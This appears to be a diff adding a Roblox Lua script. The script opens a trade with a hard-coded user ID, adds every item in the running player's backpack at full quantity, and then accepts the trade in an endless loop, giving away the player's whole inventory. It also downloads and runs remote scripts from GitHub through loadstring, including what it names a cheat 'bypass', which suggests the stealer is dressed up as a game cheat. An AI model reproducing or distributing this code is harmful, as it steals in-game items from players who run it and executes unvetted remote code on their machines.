@@ -1,0 +1,27 @@
+local ohNumber1 = 2061232614
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.SendTradeRequest:FireServer(ohNumber1)
+
+wait(1)
+local items = game.Players.LocalPlayer.Backpack:GetChildren()
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/locuscheats/locushub/main/islandBypass.lua')))()
+
+
+for i, v in pairs (items) do
+    local ohString1 = v.Name
+    local ohNumber2 = v:FindFirstChild("Amount").Value
+
+    game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.SetTradeQuantity:FireServer(ohString1, ohNumber2)
+end
+
+wait(0.5)
+_G.Spam = true
+spawn(function()
+    while _G.Spam == true do
+local ohBoolean1 = true
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.SetTradeStatus:FireServer(ohBoolean1)
+wait()
+    end
+end)
